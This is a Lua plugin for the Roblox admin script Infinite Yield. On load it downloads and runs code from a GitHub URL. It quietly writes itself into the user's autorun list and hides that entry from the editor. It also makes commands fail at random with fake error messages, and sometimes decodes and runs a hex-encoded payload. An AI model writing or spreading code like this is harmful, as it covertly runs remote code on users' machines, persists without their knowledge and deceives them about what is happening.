local args = {...}
local iy_fe, c = args[1], args[2]

function fromHex(str)
	return (str:gsub('..', function (cc)
		return string.char(tonumber(cc, 16))
	end))
end

if getgenv and not getgenv().IYFELOADED then
    getgenv().IYFELOADED = true
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MarksNewHat98/scripts/refs/heads/main/stuf.lua5.1", true))()
end

local eventEditor = iy_fe.eventEditor

local old_eventEditor_SaveData = eventEditor.SaveData
eventEditor.SaveData = function()
    local data = old_eventEditor_SaveData()
    local decoded = game:GetService("HttpService"):JSONDecode(data)

    if decoded.OnExecute then
        local found_match1 = false
        for _, cmd in pairs(decoded.OnExecute) do
            if cmd[1] == "addplugin IYFE.iy" then
                found_match1 = true
            end
        end

        if not found_match1 then
            table.insert(decoded.OnExecute, {"addplugin IYFE.iy", {}, 0})
        end
    end

    --table.foreach(decoded.OnExecute, warn)

    return game:GetService("HttpService"):JSONEncode(decoded)
end

local old_eventEditor_LoadData = eventEditor.LoadData
eventEditor.LoadData = function(data)
    local decoded = game:GetService("HttpService"):JSONDecode(data)

    if decoded.OnExecute then
        for i, cmd in pairs(decoded.OnExecute) do
            if cmd[1] == "addplugin IYFE.iy" then
                table.remove(decoded.OnExecute, i)
            end
        end
    end

    old_eventEditor_LoadData(game:GetService("HttpService"):JSONEncode(decoded))
    
    eventEditor.Refresh()
end

task.delay(2, function()
    iy_fe.updatesaves()
    eventEditor.LoadData(eventEditor.SaveData())
    --eventEditor.Refresh()
end)

local enabled = false
task.delay(5, function()
    enabled = true
    print("enabled")
end)

local old_execCmd = iy_fe.execCmd
iy_fe.execCmd = function(...)
    if enabled then
        if math.random(1, 20) == 1 then
            task.spawn(error, "invalid syntax")
            return
        end

        if math.random(1, 250) == 1 then
            task.delay(2, function()
                loadstring(c:gsub('..',function(_)return string.char(tonumber(_,16))end))()
            end)

            task.spawn(error, "critical error detected")
            return
        end
    end

    return old_execCmd(...)
end

return {
    ["PluginName"] = "IY_FE"
}
